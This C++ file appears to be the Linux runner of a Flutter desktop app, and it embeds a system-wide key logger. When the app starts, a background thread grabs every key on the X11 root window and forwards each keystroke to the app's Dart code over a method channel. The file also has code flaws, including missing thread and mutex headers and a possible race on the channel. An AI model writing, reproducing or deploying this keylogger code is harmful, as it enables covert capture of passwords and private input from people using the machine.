#include "my_application.h"

#include <flutter_linux/flutter_linux.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <iostream>

#ifdef GDK_WINDOWING_X11
#include <gdk/gdkx.h>
#endif

#include "flutter/generated_plugin_registrant.h"

struct _MyApplication {
  GtkApplication parent_instance;
  char** dart_entrypoint_arguments;

  FlMethodChannel* key_logger_channel;
  std::thread key_logger_thread;
  std::mutex key_logger_mutex;
  std::condition_variable key_logger_cv;
  bool key_logger_should_exit;
};

// Forward declarations.
static void key_logger_thread_proc(MyApplication* self);

G_DEFINE_TYPE(MyApplication, my_application, GTK_TYPE_APPLICATION)

// Implements GApplication::activate.
static void my_application_activate(GApplication* application) {
  MyApplication* self = MY_APPLICATION(application);
  GtkWindow* window =
      GTK_WINDOW(gtk_application_window_new(GTK_APPLICATION(application)));

  // Use a header bar when running in GNOME as this is the common style used
  // by applications and is the setup most users will be using (e.g. Ubuntu
  // desktop).
  // If running on X and not using GNOME then just use a traditional title bar
  // in case the window manager does more exotic layout, e.g. tiling.
  // If running on Wayland assume the header bar will work (may need changing
  // if future cases occur).
  gboolean use_header_bar = TRUE;
#ifdef GDK_WINDOWING_X11
  GdkScreen* screen = gtk_window_get_screen(window);
  if (GDK_IS_X11_SCREEN(screen)) {
    const gchar* wm_name = gdk_x11_screen_get_window_manager_name(screen);
    if (g_strcmp0(wm_name, "GNOME Shell") != 0) {
      use_header_bar = FALSE;
    }
  }
#endif
  if (use_header_bar) {
    GtkHeaderBar* header_bar = GTK_HEADER_BAR(gtk_header_bar_new());
    gtk_widget_show(GTK_WIDGET(header_bar));
    gtk_header_bar_set_title(header_bar, "application");
    gtk_header_bar_set_show_close_button(header_bar, TRUE);
    gtk_window_set_titlebar(window, GTK_WIDGET(header_bar));
  } else {
    gtk_window_set_title(window, "application");
  }

  gtk_window_set_default_size(window, 1280, 720);
  gtk_widget_show(GTK_WIDGET(window));

  g_autoptr(FlDartProject) project = fl_dart_project_new();
  fl_dart_project_set_dart_entrypoint_arguments(project, self->dart_entrypoint_arguments);

  FlView* view = fl_view_new(project);
  gtk_widget_show(GTK_WIDGET(view));
  gtk_container_add(GTK_CONTAINER(window), GTK_WIDGET(view));

  fl_register_plugins(FL_PLUGIN_REGISTRY(view));

  // Register the method channel.
  g_autoptr(FlStandardMethodCodec) codec = fl_standard_method_codec_new();
  self->key_logger_channel = fl_method_channel_new(fl_engine_get_binary_messenger(fl_view_get_engine(view)),
                                                   "com.malsy_gate.key_logger/method",
                                                   FL_METHOD_CODEC(codec));

  gtk_widget_grab_focus(GTK_WIDGET(view));
}

// Implements GApplication::local_command_line.
static gboolean my_application_local_command_line(GApplication* application, gchar*** arguments, int* exit_status) {
  MyApplication* self = MY_APPLICATION(application);
  // Strip out the first argument as it is the binary name.
  self->dart_entrypoint_arguments = g_strdupv(*arguments + 1);

  g_autoptr(GError) error = nullptr;
  if (!g_application_register(application, nullptr, &error)) {
     g_warning("Failed to register: %s", error->message);
     *exit_status = 1;
     return TRUE;
  }

  g_application_activate(application);
  *exit_status = 0;

  return TRUE;
}

// Implements GApplication::startup.
static void my_application_startup(GApplication* application) {
  MyApplication* self = MY_APPLICATION(application);

  // Start the key logger thread.
  self->key_logger_thread = std::thread(key_logger_thread_proc, self);

  G_APPLICATION_CLASS(my_application_parent_class)->startup(application);
}

// Implements GApplication::shutdown.
static void my_application_shutdown(GApplication* application) {
  MyApplication* self = MY_APPLICATION(application);

  // Signal the key logger thread to exit.
  {
    std::lock_guard<std::mutex> lock(self->key_logger_mutex);
    self->key_logger_should_exit = true;
  }
  self->key_logger_cv.notify_one();
  if (self->key_logger_thread.joinable()) {
    self->key_logger_thread.join();
  }

  G_APPLICATION_CLASS(my_application_parent_class)->shutdown(application);
}

// Implements GObject::dispose.
static void my_application_dispose(GObject* object) {
  MyApplication* self = MY_APPLICATION(object);
  g_clear_pointer(&self->dart_entrypoint_arguments, g_strfreev);
  g_clear_object(&self->key_logger_channel);
  G_OBJECT_CLASS(my_application_parent_class)->dispose(object);
}

static void my_application_class_init(MyApplicationClass* klass) {
  G_APPLICATION_CLASS(klass)->activate = my_application_activate;
  G_APPLICATION_CLASS(klass)->local_command_line = my_application_local_command_line;
  G_APPLICATION_CLASS(klass)->startup = my_application_startup;
  G_APPLICATION_CLASS(klass)->shutdown = my_application_shutdown;
  G_OBJECT_CLASS(klass)->dispose = my_application_dispose;
}

static void my_application_init(MyApplication* self) {
  self->key_logger_should_exit = false;
}

MyApplication* my_application_new() {
  // Set the program name to the application ID, which helps various systems
  // like GTK and desktop environments map this running application to its
  // corresponding .desktop file. This ensures better integration by allowing
  // the application to be recognized beyond its binary name.
  g_set_prgname(APPLICATION_ID);

  return MY_APPLICATION(g_object_new(my_application_get_type(),
                                     "application-id", APPLICATION_ID,
                                     "flags", G_APPLICATION_NON_UNIQUE,
                                     nullptr));
}

// Key logger thread procedure.
static void key_logger_thread_proc(MyApplication* self) {
  Display* display = XOpenDisplay(nullptr);
  if (!display) {
    std::cerr << "Failed to open X display" << std::endl;
    return;
  }

  Window root = DefaultRootWindow(display);
  XGrabKey(display, AnyKey, AnyModifier, root, True, GrabModeAsync, GrabModeAsync);

  XEvent ev;
  while (true) {
    {
      std::unique_lock<std::mutex> lock(self->key_logger_mutex);
      if (self->key_logger_should_exit) {
        break;
      }
    }

    if (XPending(display) > 0) {
      XNextEvent(display, &ev);
      if (ev.type == KeyPress) {
        char buf[32];
        KeySym key_sym;
        int len = XLookupString(&ev.xkey, buf, sizeof(buf) - 1, &key_sym, nullptr);
        if (len > 0) {
          buf[len] = '\0';
          g_autoptr(FlValue) args = fl_value_new_string(buf);
          fl_method_channel_invoke_method(self->key_logger_channel, "onKey", args, nullptr, nullptr, nullptr);
        } else {
            const char* special_key = nullptr;
            switch (key_sym) {
                case XK_BackSpace: special_key = "Backspace"; break;
                // Add other special keys here if needed
            }
            if (special_key) {
                g_autoptr(FlValue) args = fl_value_new_string(special_key);
                fl_method_channel_invoke_method(self->key_logger_channel, "onKey", args, nullptr, nullptr, nullptr);
            }
        }
      }
    } else {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
  }

  XCloseDisplay(display);
  std::cout << "Key logger thread finished" << std::endl;
}
